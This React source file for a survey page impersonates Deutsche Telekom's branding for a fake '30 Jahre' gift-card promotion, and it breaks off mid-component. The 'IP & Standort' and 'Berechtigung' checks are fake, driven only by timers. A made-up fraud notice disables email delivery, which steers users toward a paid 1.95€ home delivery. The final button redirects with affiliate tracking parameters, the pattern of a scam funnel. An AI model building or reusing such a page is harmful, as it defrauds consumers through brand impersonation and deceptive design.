import React, { useState, useEffect, useMemo, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Label } from '@/components/ui/label';
import { Star, ChevronLeft, ChevronRight, Search, Phone, ShoppingCart, User, Menu } from 'lucide-react';

// Optimized brand logos object
const brandLogos = {
  otto: '/lovable-uploads/37661bc2-befd-4af2-a40d-2b2eab85905b.png',
  amazon: '/lovable-uploads/5706dc74-fbd3-4509-bd70-be7ece552da4.png',
  hm: '/lovable-uploads/437a259c-aa7a-451b-bd9c-16578a6176bf.png',
  zalando: '/lovable-uploads/7ab6f500-1d20-4002-bf77-28e37b63038a.png',
  douglas: '/lovable-uploads/95dd02e6-344d-4f50-84af-f025c870e6d4.png',
  telekom: '/lovable-uploads/3e49a8df-ca13-4797-b908-fd71651ff987.png'
} as const;

// Memoized brand configuration
const brandConfig = {
  otto: { name: 'OTTO', website: 'Otto.de', color: 'bg-red-600', textColor: 'text-red-600', value: '50€' },
  hm: { name: 'H&M', website: 'H&M', color: 'bg-black', textColor: 'text-black', value: '50€' },
  amazon: { name: 'amazon.de', website: 'Amazon', color: 'bg-orange-500', textColor: 'text-black', value: '50€' },
  douglas: { name: 'DOUGLAS', website: 'Douglas.de', color: 'bg-black', textColor: 'text-black', value: '50€' },
  telekom: { name: 'T', website: 'Telekom', color: 'bg-pink-600', textColor: 'text-pink-600', value: '60€' },
  zalando: { name: '🧡 zalando', website: 'Zalando.de', color: 'bg-orange-500', textColor: 'text-orange-500', value: '50€' }
} as const;

// Optimized brand grid data
const brandGridItems = [
  { name: 'Otto.de', brand: 'otto' as keyof typeof brandConfig },
  { name: 'H&M', brand: 'hm' as keyof typeof brandConfig },
  { name: 'Amazon', brand: 'amazon' as keyof typeof brandConfig },
  { name: 'Douglas.de', brand: 'douglas' as keyof typeof brandConfig },
  { name: 'Telekom', brand: 'telekom' as keyof typeof brandConfig },
  { name: 'Zalando.de', brand: 'zalando' as keyof typeof brandConfig }
] as const;

const Survey = () => {
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(true);
  const [currentStep, setCurrentStep] = useState(1);
  const [answers, setAnswers] = useState<Record<string, string>>({});
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingStep, setProcessingStep] = useState(1);
  const [showRewards, setShowRewards] = useState(false);
  const [selectedBrand, setSelectedBrand] = useState<keyof typeof brandConfig>('otto');
  const [selectedDelivery, setSelectedDelivery] = useState('');
  const [showEmailError, setShowEmailError] = useState(false);
  const [selectedAddress, setSelectedAddress] = useState('');
  const [rewardStep, setRewardStep] = useState(1);

  const totalSteps = 9;

  // Memoized questions array
  const questions = useMemo(() => [
    {
      id: 'satisfaction',
      title: 'Wie zufrieden sind Sie mit Ihrer aktuellen T-Online-Erfahrung?',
      subtitle: '(1 = Sehr unzufrieden, 5 = Sehr zufrieden)',
      type: 'star-rating',
      options: []
    },
    {
      id: 'price-performance',
      title: 'Wie bewerten Sie das Preis-Leistungs-Verhältnis Ihres T-Online-Dienstes?',
      subtitle: '(1 = Sehr schlecht, 5 = Hervorragend)',
      type: 'star-rating',
      options: []
    },
    {
      id: 'recommendation',
      title: 'Wie wahrscheinlich ist es, dass Sie T-Online einem Freund oder Kollegen empfehlen?',
      subtitle: '(1 = Überhaupt nicht wahrscheinlich, 5 = Sehr wahrscheinlich)',
      type: 'star-rating',
      options: []
    },
    {
      id: 'customer-service',
      title: 'Wie empfinden Sie unseren Kundenservice?',
      subtitle: '(1 = Sehr schlecht, 5 = Hervorragend)',
      type: 'star-rating',
      options: []
    },
    {
      id: 'connection-reliability',
      title: 'Wie empfinden Sie die Zuverlässigkeit Ihrer T-Online-Verbindung (Internet/Mobilfunk)?',
      subtitle: '(1 = Sehr schlecht, 5 = Sehr zuverlässig)',
      type: 'star-rating',
      options: []
    },
    {
      id: 'expectations',
      title: 'Was erwarten Sie am meisten von Ihrem Telekommunikationsanbieter?',
      subtitle: '',
      type: 'radio',
      options: [
        'Schnelles Internet',
        'Hilfreicher Kundensupport',
        'Erschwingliche Preise',
        'Neue Technologien & Innovation',
        'Treuepramien'
      ]
    },
    {
      id: 'rewards',
      title: 'Welche Art von Belohnung würden Sie am meisten genießen?',
      subtitle: '',
      type: 'radio',
      options: [
        'Kostenlose Daten oder zusätzliche Monate',
        'Rabatt auf ein neues Handy/Gerät',
        'Online-Shop-Gutschein (z. B. Bol.com)',
        'Exklusiver Zugang zum Testpanel',
        'Spende an einen guten Zweck in meinem Namen'
      ]
    },
    {
      id: 'communication',
      title: 'Wie möchten Sie am liebsten über neue Angebote oder Updates informiert werden?',
      subtitle: '',
      type: 'radio',
      options: [
        'E-Mail',
        'SMS',
        'In der App',
        'Soziale Medien',
        'Ich möchte keine Werbung erhalten'
      ]
    },
    {
      id: 'overall-experience',
      title: 'Wie würden Sie Ihre gesamte Erfahrung mit T-Online bewerten?',
      subtitle: '(1 = Sehr schlecht, 5 = Ausgezeichnet)',
      type: 'star-rating',
      options: []
    }
  ], []);

  // Memoized current brand and question
  const currentBrand = useMemo(() => brandConfig[selectedBrand], [selectedBrand]);
  const currentQuestion = useMemo(() => questions[currentStep - 1], [questions, currentStep]);

  // Optimized loading effect
  useEffect(() => {
    const timer = setTimeout(() => setIsLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  // Optimized processing effect
  useEffect(() => {
    if (!isProcessing) return;

    const steps = [
      { delay: 1000, step: 1 },
      { delay: 3000, step: 2 },
      { delay: 5000, step: 3 },
      { delay: 7000, step: 4 }
    ];

    const timeouts = steps.map(({ delay, step }) =>
      setTimeout(() => {
        if (step === 4) {
          setIsProcessing(false);
          setShowRewards(true);
        } else {
          setProcessingStep(step);
        }
      }, delay)
    );

    return () => timeouts.forEach(clearTimeout);
  }, [isProcessing]);

  // Memoized event handlers
  const handleStarRating = useCallback((questionId: string, rating: number) => {
    setAnswers(prev => ({ ...prev, [questionId]: rating.toString() }));
  }, []);

  const handleRadioChange = useCallback((questionId: string, value: string) => {
    setAnswers(prev => ({ ...prev, [questionId]: value }));
  }, []);

  const handleNext = useCallback(() => {
    if (currentStep < totalSteps) {
      setCurrentStep(prev => prev + 1);
    }
  }, [currentStep, totalSteps]);

  const handleBack = useCallback(() => {
    if (currentStep > 1) {
      setCurrentStep(prev => prev - 1);
    }
  }, [currentStep]);

  const handleSubmit = useCallback(() => {
    console.log('Survey completed:', answers);
    setIsProcessing(true);
    setProcessingStep(1);
  }, [answers]);

  const handleBrandSelect = useCallback((brand: keyof typeof brandConfig) => {
    setSelectedBrand(brand);
    setRewardStep(1);
  }, []);

  const handleEmailClick = useCallback(() => {
    setSelectedDelivery('');
    setSelectedAddress('');
    setShowEmailError(true);
    setRewardStep(1);
  }, []);

  const handleHomeSelect = useCallback(() => {
    setSelectedDelivery('home');
    setShowEmailError(false);
    setRewardStep(2);
  }, []);

  const handleAddressSelect = useCallback((addressType: string) => {
    setSelectedAddress(addressType);
    setRewardStep(3);
  }, []);

  const handleWeiterClick = useCallback(() => {
    const subId4 = "30 Jahre Deutsche Telekom - 50€ Geschenkkarte";
    const subId5 = brandLogos[selectedBrand];
    const redirectUrl = `/?_lp=1&sub_id_4=${encodeURIComponent(subId4)}&sub_id_5=${encodeURIComponent(subId5)}`;
    window.location.href = redirectUrl;
  }, [selectedBrand]);

  // Memoized render functions for better performance
  const renderStarRating = useCallback((questionId: string) => {
    const currentRating = parseInt(answers[questionId] || '0');
    
    return (
      <div className="flex justify-center items-center space-x-2 sm:space-x-3 my-6 sm:my-8">
        {[1, 2, 3, 4, 5].map((star) => (
          <button
            key={star}
            onClick={() => handleStarRating(questionId, star)}
            className="transition-colors duration-200 active:scale-95 p-1 touch-manipulation"
            aria-label={`${star} von 5 Sternen`}
          >
            <Star
              className={`w-6 h-6 sm:w-8 sm:h-8 ${
                star <= currentRating
                  ? 'fill-pink-600 text-pink-600'
                  : 'fill-gray-200 text-gray-200'
              }`}
            />
          </button>
        ))}
      </div>
    );
  }, [answers, handleStarRating]);

  const renderRadioOptions = useCallback((questionId: string, options: string[]) => {
    return (
      <RadioGroup
        value={answers[questionId] || ''}
        onValueChange={(value) => handleRadioChange(questionId, value)}
        className="space-y-3 my-6 sm:my-8"
      >
        {options.map((option, index) => (
          <div key={index} className="flex items-start space-x-4 p-5 rounded-xl border border-gray-200 hover:border-gray-300 hover:bg-gray-50/80 transition-all duration-200 touch-manipulation group cursor-pointer">
            <RadioGroupItem 
              value={option} 
              id={`${questionId}-${index}`} 
              className="mt-0.5 shrink-0" 
            />
            <Label 
              htmlFor={`${questionId}-${index}`} 
              className="text-gray-800 cursor-pointer text-base leading-relaxed font-normal group-hover:text-gray-900 transition-colors flex-1 select-none"
            >
              {option}
            </Label>
          </div>
        ))}
      </RadioGroup>
    );
  }, [answers, handleRadioChange]);

  // Memoized brand grid component
  const BrandGrid = useMemo(() => (
    <div className="grid grid-cols-2 gap-3 sm:gap-4 mb-6">
      {brandGridItems.map((item) => (
        <button
          key={item.brand}
          onClick={() => handleBrandSelect(item.brand)}
          className={`aspect-square border-2 rounded-lg transition-all p-3 sm:p-4 touch-manipulation ${
            selectedBrand === item.brand
              ? 'border-pink-600 bg-pink-50'
              : 'border-gray-300 hover:border-pink-300 bg-white'
          }`}
        >
          <div className="h-full flex flex-col items-center justify-center">
            <div className="h-10 sm:h-12 flex items-center justify-center mb-2">
              <img 
                src={brandLogos[item.brand]} 
                alt={item.name}
                className="h-10 sm:h-12 max-w-[70px] sm:max-w-[80px] object-contain"
                loading="lazy"
              />
            </div>
            <div className="text-xs sm:text-sm text-gray-600 text-center font-medium">{item.name}</div>
          </div>
        </button>
      ))}
    </div>
  ), [selectedBrand, handleBrandSelect]);

  // Early return for loading state
  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-600">
        <div className="flex flex-col items-center space-y-4">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white"></div>
          <p className="text-white font-medium">Umfrage wird geladen...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <header className="bg-white shadow-sm">
        {/* Top pink bar - hidden on mobile */}
        <div className="bg-pink-600 text-white px-4 py-2 text-sm hidden md:block">
          <div className="max-w-7xl mx-auto flex justify-between items-center">
            <div className="flex space-x-6">
              <span className="font-medium text-white">Privatkunden</span>
              <span className="text-pink-200 hover:text-white cursor-pointer transition-colors">Geschäftskunden</span>
            </div>
            <div className="flex space-x-6">
              <span className="hover:text-pink-200 cursor-pointer transition-colors">Telekom Shops</span>
              <span className="hover:text-pink-200 cursor-pointer transition-colors">Kontakt</span>
            </div>
          </div>
        </div>
        
        {/* Main header */}
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex items-center justify-between h-16">
            {/* Desktop Layout */}
            <div className="hidden md:flex items-center justify-between w-full h-full">
              <div className="flex items-center space-x-6 xl:space-x-8 h-full">
                <div className="h-full w-16 bg-pink-600 flex items-center justify-center shrink-0">
                  <img 
                    src="/lovable-uploads/3a50a6ae-c8a9-4e79-8237-5c8031a412fd.png" 
                    alt="Telekom" 
                    className="w-8 h-8 object-contain"
                    loading="lazy"
                  />
                </div>
                <nav className="flex space-x-4 lg:space-x-6 overflow-x-auto">
                  <span className="text-pink-600 font-medium whitespace-nowrap">30 Jahre | Aktionen</span>
                  <span className="text-gray-600 hover:text-pink-600 cursor-pointer whitespace-nowrap transition-colors">Mobilfunk</span>
                  <span className="text-gray-600 hover:text-pink-600 cursor-pointer whitespace-nowrap transition-colors">Internet</span>
                  <span className="text-gray-600 hover:text-pink-600 cursor-pointer whitespace-nowrap transition-colors">TV</span>
                  <span className="text-gray-600 hover:text-pink-600 cursor-pointer whitespace-nowrap transition-colors">MeinMagenta App</span>
                  <span className="text-gray-600 hover:text-pink-600 cursor-pointer whitespace-nowrap transition-colors">Glasfaser</span>
                  <span className="text-gray-600 hover:text-pink-600 cursor-pointer whitespace-nowrap transition-colors">Service</span>
                </nav>
              </div>
              <div className="flex items-center space-x-3 lg:space-x-4 shrink-0">
                <Search className="w-5 h-5 text-gray-600 cursor-pointer hover:text-pink-600 transition-colors" />
                <div className="w-6 h-6 border border-gray-600 rounded cursor-pointer hover:border-pink-600 transition-colors flex items-center justify-center">
                  <Phone className="w-3 h-3 text-gray-600" />
                </div>
                <Phone className="w-5 h-5 text-gray-600 cursor-pointer hover:text-pink-600 transition-colors" />
                <ShoppingCart className="w-5 h-5 text-gray-600 cursor-pointer hover:text-pink-600 transition-colors" />
                <div className="relative">
                  <User className="w-5 h-5 text-gray-600 cursor-pointer hover:text-pink-600 transition-colors" />
                  <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-500 rounded-full"></div>
                </div>
              </div>
            </div>

            {/* Mobile Layout */}
            <div className="flex md:hidden items-center justify-between w-full h-full">
              <div className="h-full w-16 bg-pink-600 flex items-center justify-center shrink-0">
                <img 
                  src="/lovable-uploads/3a50a6ae-c8a9-4e79-8237-5c8031a412fd.png" 
                  alt="Telekom" 
                  className="w-8 h-8 object-contain"
                  loading="lazy"
                />
              </div>
              <div className="flex items-center space-x-3 shrink-0">
                <Search className="w-6 h-6 text-gray-600 cursor-pointer active:scale-95 transition-transform" />
                <div className="w-7 h-7 border border-gray-600 rounded cursor-pointer active:scale-95 transition-transform flex items-center justify-center">
                  <Phone className="w-4 h-4 text-gray-600" />
                </div>
                <Phone className="w-6 h-6 text-gray-600 cursor-pointer active:scale-95 transition-transform" />
                <ShoppingCart className="w-6 h-6 text-gray-600 cursor-pointer active:scale-95 transition-transform" />
                <div className="relative">
                  <User className="w-6 h-6 text-gray-600 cursor-pointer active:scale-95 transition-transform" />
                  <div className="absolute -top-1 -right-1 w-3 h-3 bg-green-500 rounded-full"></div>
                </div>
                <Menu className="w-6 h-6 text-gray-600 cursor-pointer active:scale-95 transition-transform" />
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Breadcrumb */}
      <div className="max-w-7xl mx-auto px-4 py-2">
        <div className="text-sm text-gray-500 overflow-x-auto whitespace-nowrap">
          <span className="hover:text-pink-600 cursor-pointer transition-colors">Telekom</span> › 
          <span className="hover:text-pink-600 cursor-pointer transition-colors"> Unterwegs</span> › 
          <span className="text-pink-600 font-medium"> Aktionen</span>
        </div>
      </div>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-4 md:py-8">
        {/* Processing Screen */}
        {isProcessing && (
          <div className="bg-white rounded-lg shadow-lg overflow-hidden p-6 sm:p-8 mx-2 sm:mx-0">
            <div className="text-center">
              <h2 className="text-lg sm:text-xl font-bold text-gray-800 mb-4">Umfrage wird verarbeitet</h2>
              <p className="text-gray-600 mb-8">Bitte warten Sie, während wir Ihre Eingabe verarbeiten</p>
              
              <div className="space-y-6 max-w-md mx-auto">
                {/* Processing steps */}
                {[
                  { step: 1, title: 'IP & Standort überprüfen', desc: 'Überprüfung Ihres geografischen Standorts...' },
                  { step: 2, title: 'Antworten speichern', desc: 'Ihre Antworten werden sicher gespeichert...' },
                  { step: 3, title: 'Berechtigung prüfen', desc: 'Überprüfung der Umfragevoraussetzungen...' }
                ].map((item) => (
                  <div key={item.step} className="flex items-center space-x-4">
                    <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
                      processingStep >= item.step ? 'bg-green-500' : processingStep === item.step - 1 ? 'bg-pink-500' : 'bg-gray-300'
                    }`}>
                      {processingStep >= item.step ? (
                        <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                        </svg>
                      ) : processingStep === item.step - 1 ? (
                        <div className="w-3 h-3 bg-white rounded-full animate-pulse"></div>
                      ) : null}
                    </div>
                    <div className="text-left">
                      <p className={`font-medium ${
                        processingStep >= item.step ? 'text-green-600' : processingStep === item.step - 1 ? 'text-pink-600' : 'text-gray-500'
                      }`}>
                        {item.title}
                      </p>
                      <p className={`text-sm ${
                        processingStep >= item.step ? 'text-green-500' : processingStep === item.step - 1 ? 'text-pink-500' : 'text-gray-400'
                      }`}>
                        {item.desc}
                      </p>
                    </div>
                  </div>
                ))}
              </div>

              {/* Progress Bar */}
              <div className="mt-8">
                <div className="w-full bg-gray-200 rounded-full h-2">
                  <div 
                    className="bg-pink-600 h-2 rounded-full transition-all duration-1000"
                    style={{ width: `${(processingStep / 3) * 100}%` }}
                  ></div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Rewards Selection Screen */}
        {showRewards && (
          <div className="bg-white min-h-screen">
            {/* Mobile Layout */}
            <div className="block md:hidden">
              {/* Step Indicators - Mobile */}
              <div className="px-4 py-6 bg-gray-50">
                <div className="flex justify-center space-x-8">
                  {[
                    { step: 1, title: 'Marke\nwählen' },
                    { step: 2, title: 'Lieferoption\nwählen' },
                    { step: 3, title: 'Auswahl\nbestätigen' }
                  ].map((item) => (
                    <div key={item.step} className="flex flex-col items-center">
                      <div className={`w-10 h-10 ${rewardStep >= item.step ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold mb-2`}>
                        {item.step}
                      </div>
                      <span className={`text-xs text-center ${rewardStep >= item.step ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>
                        {item.title}
                      </span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Single Scrolling Page - Mobile */}
              <div className="px-4 py-6">
                {/* Brand Selection Section */}
                <div className="mb-8">
                  <h2 className="text-xl font-semibold text-pink-600 mb-6">Marke auswählen</h2>
                  
                  {/* Brand Grid - Mobile */}
                  {BrandGrid}

                  {/* Mobile Gift Card */}
                  <div className={`${currentBrand.color} text-white p-4 sm:p-6 rounded-lg mb-6`}>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-2 sm:space-x-3 min-w-0 flex-1">
                        <img 
                          src={brandLogos[selectedBrand]} 
                          alt={currentBrand.name}
                          className="h-6 w-6 sm:h-8 sm:w-8 object-contain filter brightness-0 invert shrink-0"
                          loading="lazy"
                        />
                        <div className="min-w-0">
                          <div className="text-sm font-medium truncate">{currentBrand.website}</div>
                          <div className="text-xs opacity-90">30 Jahre Deutsche Telekom</div>
                          <div className="text-xs opacity-90 leading-tight">Gültig in allen Telekom Shops und auf telekom.de</div>
                        </div>
                      </div>
                      <div className="text-right shrink-0 ml-2">
                        <div className="text-xs opacity-90">Geschenkkarte</div>
                        <div className="text-xl sm:text-2xl font-bold">{currentBrand.value}</div>
                      </div>
                    </div>
                  </div>

                  <h3 className="text-lg font-semibold text-pink-600 mb-2">{currentBrand.website} Geschenkkarte - {currentBrand.value}</h3>
                  <p className="text-sm text-gray-600 mb-4">
                    30 Jahre Deutsche Telekom - Wir feiern mit großartigen Angeboten und Aktionen! Nutzen Sie diese 
                    Geschenkkarte in jedem Telekom Shop oder online auf telekom.de. Nur im Juni verfügbar.
                  </p>
                  
                  <ul className="text-sm text-gray-600 space-y-1 mb-8">
                    <li>• Wert: {currentBrand.value}</li>
                    <li>• Gültig für 1 Jahr ab Kaufdatum</li>
                    <li>• Kann für alle Telekom Produkte oder Dienstleistungen verwendet werden</li>
                  </ul>
                </div>

                {/* Delivery Options Section - Mobile */}
                <div className="mb-8">
                  <h2 className="text-xl font-semibold text-pink-600 mb-6">Lieferoption wählen</h2>
                  
                  {/* Warning Box - Only show when E-Mail is clicked */}
                  {showEmailError && (
                    <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
                      <div className="flex items-start space-x-3">
                        <div className="w-4 h-4 border-2 border-red-500 rounded-full flex-shrink-0 mt-0.5"></div>
                        <div className="text-sm text-red-700">
                          Aufgrund von Betrügs- und Missbrauchsfällen ist ein Abgleich der Vertrags- mit der 
                          Lieferadresse erforderlich. Deshalb wurde der Versand der Geschenkkarte per E-Mail 
                          deaktiviert. Vielen Dank für Ihr Verständnis.
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Delivery Options */}
                  <div className="space-y-4 mb-6">
                    <RadioGroup
                      value={selectedDelivery}
                      onValueChange={(value) => {
                        if (value === 'email') {
                          handleEmailClick();
                        } else if (value === 'home') {
                          handleHomeSelect();
                        }
                      }}
                      className="space-y-3"
                    >
                      {/* E-Mail Option */}
                      <div 
                        onClick={handleEmailClick}
                        className="flex items-start space-x-4 p-5 rounded-xl border border-gray-200 hover:border-gray-300 hover:bg-gray-50/80 transition-all duration-200 touch-manipulation cursor-pointer"
                      >
                        <RadioGroupItem 
                          value="email" 
                          id="email-delivery-mobile" 
                          className="mt-0.5 shrink-0" 
                        />
                        <div className="flex-1 flex items-center justify-between">
                          <div className="text-left">
                            <Label htmlFor="email-delivery-mobile" className="font-semibold text-gray-800 cursor-pointer select-none flex items-center">
                              ✉️ E-Mail-Versand
                            </Label>
                            <div className="text-sm text-gray-600 mt-1">Erhalten Sie Ihre Geschenkkarte sofort per E-Mail</div>
                          </div>
                          <div className="text-green-600 font-semibold">Kostenlos</div>
                        </div>
                      </div>

                      {/* Home Delivery Option */}
                      <div 
                        onClick={handleHomeSelect}
                        className="flex items-start space-x-4 p-5 rounded-xl border border-gray-200 hover:border-gray-300 hover:bg-gray-50/80 transition-all duration-200 touch-manipulation cursor-pointer"
                      >
                        <RadioGroupItem 
                          value="home" 
                          id="home-delivery-mobile" 
                          className="mt-0.5 shrink-0" 
                        />
                        <div className="flex-1 flex items-center justify-between">
                          <div className="text-left">
                            <Label htmlFor="home-delivery-mobile" className="font-semibold text-gray-800 cursor-pointer select-none flex items-center">
                              🏠 Heimversand
                            </Label>
                            <div className="text-sm text-gray-600 mt-1">Erhalten Sie eine physische Geschenkkarte an Ihre Adresse geliefert</div>
                          </div>
                          <div className="font-semibold text-gray-800">+1.95€</div>
                        </div>
                      </div>
                    </RadioGroup>
                  </div>

                  {/* Address Selection - Show when home delivery is selected */}
                  {selectedDelivery === 'home' && (
                    <>
                      <div className="text-sm font-semibold text-pink-600 mb-4">Empfänger auswählen:</div>

                      {/* Info Box */}
                      <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg mb-6">
                        <div className="flex items-start space-x-2">
                          <div className="w-4 h-4 bg-blue-500 rounded-full flex-shrink-0 mt-0.5"></div>
                          <div className="text-sm text-blue-700">
                            Wir senden Ihnen eine E-Mail mit den Versandinformationen und den Details Ihrer 
                            Bestellung, sobald Ihre Adresse erfolgreich überprüft wurde und Sie zur Lieferung 
                            berechtigt sind.
                          </div>
                        </div>
                      </div>

                       {/* Address Options */}
                       <RadioGroup
                         value={selectedAddress}
                         onValueChange={(value) => handleAddressSelect(value)}
                         className="space-y-3"
                       >
                         {/* Meine Adresse Option */}
                         <div 
                           onClick={() => handleAddressSelect('meine')}
                           className="flex items-start space-x-4 p-5 rounded-xl border border-gray-200 hover:border-gray-300 hover:bg-gray-50/80 transition-all duration-200 touch-manipulation cursor-pointer"
                         >
                           <RadioGroupItem 
                             value="meine" 
                             id="meine-adresse-mobile" 
                             className="mt-0.5 shrink-0" 
                           />
                           <div className="flex-1">
                             <Label htmlFor="meine-adresse-mobile" className="font-semibold text-gray-800 cursor-pointer select-none flex items-center">
                               👤 Meine Adresse
                             </Label>
                             <div className="text-sm text-gray-600 mt-1">Senden Sie die Geschenkkarte an meine Lieferadresse</div>
                           </div>
                         </div>

                         {/* Grayed out option - nicht auswählbar */}
                         <div className="flex items-start space-x-4 p-5 rounded-xl border border-gray-200 bg-gray-100 opacity-60 cursor-not-allowed">
                           <div className="w-6 h-6 border-2 border-gray-400 rounded-full bg-gray-200 mt-0.5 shrink-0"></div>
                           <div className="flex-1">
                             <div className="font-semibold text-gray-500 flex items-center">
                               👥 Adresse einer anderen Person
                             </div>
                             <div className="text-sm text-gray-400 mt-1">Senden Sie die Geschenkkarte direkt an den Empfänger</div>
                           </div>
                         </div>
                       </RadioGroup>
                    </>
                  )}

                  {/* Continue Button */}
                  {selectedAddress === 'meine' ? (
                    <button 
                      onClick={handleWeiterClick}
                      className="w-full bg-pink-600 hover:bg-pink-700 text-white py-3 rounded-lg font-semibold text-lg transition-colors touch-manipulation"
                    >
                      Weiter
                    </button>
                  ) : (
                    <button 
                      className="w-full bg-gray-300 text-gray-600 cursor-not-allowed py-3 rounded-lg font-semibold text-lg"
                      disabled
                    >
                      Weiter
                    </button>
                  )}

                  <p className="text-xs text-gray-500 mt-4 text-center">
                    Die Geschenkkarte wird per Post versendet und kann je nach Anbieter als Plastikkarte, 
                    ausgedruckter Gutschein oder in einer Geschenkverpackung ankommen.
                  </p>
                </div>
              </div>
            </div>

            {/* Desktop Layout (existing) */}
            <div className="hidden md:block">
              {/* Step Indicators */}
              <div className="bg-gray-50 px-8 py-6">
                <div className="flex justify-center space-x-8">
                  <div className="flex items-center space-x-2">
                    <div className={`w-8 h-8 ${rewardStep >= 1 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold`}>
                      1
                    </div>
                    <span className={`${rewardStep >= 1 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Marke wählen</span>
                  </div>
                  <div className="flex items-center space-x-2">
                    <div className={`w-8 h-8 ${rewardStep >= 2 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold`}>
                      2
                    </div>
                    <span className={`${rewardStep >= 2 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Lieferoption wählen</span>
                  </div>
                  <div className="flex items-center space-x-2">
                    <div className={`w-8 h-8 ${rewardStep >= 3 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm`}>
                      3
                    </div>
                    <span className={`${rewardStep >= 3 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Auswahl bestätigen</span>
                  </div>
                </div>
              </div>

              <div className="p-8">
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                  {/* Brand Selection */}
                  <div>
                    <h3 className="text-lg font-semibold text-pink-600 mb-6">Marke auswählen</h3>
                    <div className="grid grid-cols-2 gap-4 mb-6">
                      {([
                        { name: 'Otto.de', brand: 'otto' },
                        { name: 'H&M', brand: 'hm' },
                        { name: 'Amazon', brand: 'amazon' },
                        { name: 'Douglas.de', brand: 'douglas' },
                        { name: 'Telekom', brand: 'telekom' },
                        { name: 'Zalando.de', brand: 'zalando' }
                      ] as const).map((item) => (
                        <button
                          key={item.brand}
                          onClick={() => handleBrandSelect(item.brand)}
                          className={`p-4 border-2 rounded-lg transition-all ${
                            selectedBrand === item.brand
                              ? 'border-pink-600 bg-pink-50'
                              : 'border-gray-300 hover:border-pink-300'
                          }`}
                        >
                          <div className="text-center">
                            <div className="h-8 flex items-center justify-center mb-2">
                              <img 
                                src={brandLogos[item.brand]} 
                                alt={item.name}
                                className="h-8 max-w-[100px] object-contain"
                              />
                            </div>
                            <div className="text-sm text-gray-600">{item.name}</div>
                          </div>
                        </button>
                      ))}
                    </div>

                    {/* Dynamic Gift Card */}
                    <div className={`${currentBrand.color} text-white p-10 rounded-lg mb-6`}>
                      <div className="flex justify-between items-center">
                        <div>
                          <div className="mb-4">
                            <img 
                              src={brandLogos[selectedBrand]} 
                              alt={currentBrand.name}
                              className="h-10 max-w-[140px] object-contain filter brightness-0 invert"
                            />
                          </div>
                          <div className="text-base">{currentBrand.website}</div>
                          <div className="text-sm mt-3">30 Jahre Deutsche Telekom<br />Gültig auf {currentBrand.website.toLowerCase()}</div>
                        </div>
                        <div className="text-right">
                          <div className="text-white text-base">Geschenkkarte</div>
                          <div className="text-white font-bold text-5xl">{currentBrand.value}</div>
                        </div>
                      </div>
                    </div>

                    <h3 className="text-lg font-semibold text-pink-600 mt-4 mb-2">{currentBrand.website} Geschenkkarte - {currentBrand.value}</h3>
                    <p className="text-sm text-gray-600 mb-4">
                      30 Jahre Deutsche Telekom - Wir feiern mit großartigen Angeboten! Nutzen Sie 
                      diese Geschenkkarte für {selectedBrand === 'otto' ? 'Mode, Möbel und mehr' : 'Millionen von Artikeln'} auf {currentBrand.website.toLowerCase()}. Nur im Juni verfügbar.
                    </p>
                    
                    <ul className="text-sm text-gray-600 space-y-1">
                      <li>• Wert: {currentBrand.value}</li>
                      <li>• Gültig für 1 Jahr ab Kaufdatum</li>
                      <li>• Kann für alle Produkte auf {currentBrand.website.toLowerCase()} verwendet werden</li>
                    </ul>
                  </div>

                  {/* Delivery Options - Desktop */}
                  <div>
                    <h3 className="text-lg font-semibold text-pink-600 mb-6">Lieferoption wählen</h3>
                    
                    {/* Warning Box - Only show when E-Mail is clicked */}
                    {showEmailError && (
                      <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
                        <div className="flex items-start space-x-3">
                          <div className="w-4 h-4 border-2 border-red-500 rounded-full flex-shrink-0 mt-0.5"></div>
                          <div className="text-sm text-red-700">
                            Aufgrund von Betrügs- und Missbrauchsfällen ist ein Abgleich der Vertrags- mit der 
                            Lieferadresse erforderlich. Deshalb wurde der Versand der Geschenkkarte per E-Mail 
                            deaktiviert. Vielen Dank für Ihr Verständnis.
                          </div>
                        </div>
                      </div>
                    )}

                    {/* Desktop delivery options */}
                    <RadioGroup
                      value={selectedDelivery}
                      onValueChange={(value) => {
                        if (value === 'email') {
                          handleEmailClick();
                        } else if (value === 'home') {
                          handleHomeSelect();
                        }
                      }}
                      className="space-y-3"
                    >
                      {/* E-Mail Option */}
                      <div 
                        onClick={handleEmailClick}
                        className="flex items-start space-x-4 p-5 rounded-xl border border-gray-200 hover:border-gray-300 hover:bg-gray-50/80 transition-all duration-200 cursor-pointer"
